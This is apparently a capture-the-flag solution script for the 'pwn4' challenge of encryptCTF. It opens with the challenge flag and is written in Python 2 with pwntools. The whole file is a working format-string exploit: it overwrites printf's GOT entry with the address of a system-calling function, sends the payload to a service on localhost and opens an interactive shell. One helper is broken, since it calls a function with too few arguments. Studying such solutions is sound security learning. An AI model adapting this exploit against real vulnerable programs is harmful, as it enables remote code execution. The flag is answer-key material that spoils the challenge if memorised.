#encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}
from pwn import *
printf_got = 0x80498fc #To overwrite
system_func = 0x804853d #Target function

def find_v_payload(old_got, new_got, stack_offset):
    find_target = "%{}x%{}$x".format(str(new_got), stack_offset)
    find_target += '\x00' * (4 - len(find_target) % 4)
    find_target += p32(old_got)
    return find_target

def rewrite_got_payload(old_got, new_got, stack_offset):
    find_target = "%{}x%{}$nBAU".format(str(new_got), stack_offset)
    find_target += '\x00' * (4 - len(find_target) % 4)
    find_target += p32(old_got)
    return find_target

def rewrite_got(old_got, new_got, stack_offset):
    p = remote('127.0.0.1', 2349)
    #p = process('./pwn4')
    payload = rewrite_got_payload(old_got, new_got, stack_offset)
    print p.recvuntil('new?')
    p.sendline(payload)
    p.recvuntil('BAU')
    print 'recvline: done'
    #p.recvuntil('0')
    p.interactive()
    #p.sendline('cat flag.txt')


def print_stack_element(old_got, new_got, stack_offset):
    p = remote('127.0.0.1', 2349)
    payload = find_v_payload(old_got, new_got, stack_offset)
    print p.recvuntil('new?')
    p.sendline(payload)
    print p.recvline().lstrip()
    print p.recvline().lstrip()
    print p.recvline().lstrip()
    print p.recvall()



#Need to find GOT addr
def find_offset_bruteforce():
    for x in range(1, 100):
        p = process('./pwn4')
        payload = find_v_payload(x)
        print p.recvuntil('new?')
        p.sendline(payload)
        print p.recvline().lstrip()
        print p.recvline().lstrip()
        print p.recvline().lstrip()
        print p.recvall()


if __name__ == '__main__':
    with open('payload', 'w+') as f:
        #f.write(find_v_payload(printf_got, system_func, 11))
        f.write(rewrite_got_payload(printf_got, system_func, 12))

    #find_offset()
    #print_stack_element(printf_got, system_func, 12)
    rewrite_got(printf_got, system_func, 12)
